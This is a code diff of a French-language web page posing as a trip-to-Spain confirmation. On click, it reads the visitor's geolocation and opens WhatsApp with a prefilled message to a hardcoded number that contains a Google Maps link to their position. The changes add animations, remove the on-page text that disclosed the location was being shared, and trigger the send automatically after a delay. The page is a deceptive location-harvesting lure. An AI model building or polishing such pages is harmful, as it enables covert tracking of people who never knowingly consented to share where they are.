@@ -11,8 +11,9 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f0f4f8;
+            background: linear-gradient(45deg, #ff7e5f, #feb47b);
             margin: 0;
+            animation: backgroundAnimation 5s infinite alternate;
         }
         .container {
             text-align: center;
@@ -20,6 +21,16 @@
             padding: 30px;
             border-radius: 15px;
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            width: 80%;
+            max-width: 500px;
+            position: relative;
+            animation: zoomIn 1s ease-out;
+        }
+        h1 {
+            font-size: 2.5em;
+            color: #333;
+            margin-bottom: 15px;
+            animation: fadeIn 2s ease-in-out;
         }
         #locationMessage {
             font-size: 18px;
@@ -28,6 +39,7 @@
             background-color: #e9f7ef;
             border-radius: 10px;
             display: none;
+            animation: slideIn 1s ease-in-out;
         }
         button {
             background-color: #25d366; 
@@ -42,19 +54,31 @@
         button:hover {
             transform: scale(1.1);
         }
+        @keyframes backgroundAnimation {
+            0% { background: linear-gradient(45deg, #ff7e5f, #feb47b); }
+            100% { background: linear-gradient(45deg, #feb47b, #ff7e5f); }
+        }
         @keyframes zoomIn {
-            0% { transform: scale(0); }
-            100% { transform: scale(1); }
+            0% { transform: scale(0.9); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        @keyframes slideIn {
+            0% { transform: translateY(20px); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>Confirmation de votre voyage en Espagne</h1>
-    <p id="instruction">Cliquez sur le bouton pour confirmer votre voyage.</p>
+    <h1>Bon voyage en Espagne 🇪🇸 !</h1>
+    <p>Confirmez votre voyage en un seul clic !</p>
 
-    <div id="locationMessage">Voyage en Espagne 🇪🇸 ! Voici ma position actuelle : <span id="mapLink"></span></div>
+    <div id="locationMessage">Bon voyage ! Nous vous avons réservé un itinéraire pour l'Espagne 🇪🇸.</div>
 
     <button id="sendLocationButton">Confirmé</button>
 </div>
@@ -76,13 +100,13 @@
         lat = position.coords.latitude;
         lon = position.coords.longitude;
 
-        // Crée le lien vers Google Maps
-        const locationUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+        // Affiche un message animé
         document.getElementById('locationMessage').style.display = 'block'; // Affiche le message
-        document.getElementById('mapLink').innerHTML = `<a href="${locationUrl}" target="_blank">Cliquez ici pour voir sur la carte</a>`;
-
-        // Animation sur le message
-        document.getElementById('locationMessage').style.animation = 'zoomIn 0.5s forwards';
+        document.getElementById('locationMessage').innerText = `Bon voyage ! Nous vous avons réservé un itinéraire pour l'Espagne 🇪🇸.`;
+        document.getElementById('locationMessage').style.animation = 'slideIn 1s ease-in-out';
+        
+        // Après un délai, on envoie la position via WhatsApp
+        setTimeout(sendLocationOnWhatsApp, 2000);
     }
 
     // En cas d'erreur lors de la récupération de la position
@@ -107,7 +131,7 @@
     function sendLocationOnWhatsApp() {
         if (lat && lon) {
             const locationUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            const message = `Voyage en Espagne 🇪🇸 ! Voici ma position actuelle : ${locationUrl}\n\nConfirmez votre voyage avec nous!`;
+            const message = `Bon voyage ! Nous vous avons réservé un itinéraire pour l'Espagne 🇪🇸.\nVoici ma position actuelle : ${locationUrl}`;
 
             const whatsappUrl = `https://wa.me/33605993097?text=${encodeURIComponent(message)}`;
             window.open(whatsappUrl, '_blank');
@@ -119,9 +143,7 @@
     // Lorsque le bouton est cliqué
     document.getElementById('sendLocationButton').addEventListener('click', function() {
         getLocation();
-        setTimeout(sendLocationOnWhatsApp, 3000); // Attendre quelques secondes avant d'envoyer
     });
-
 </script>
 
 </body>
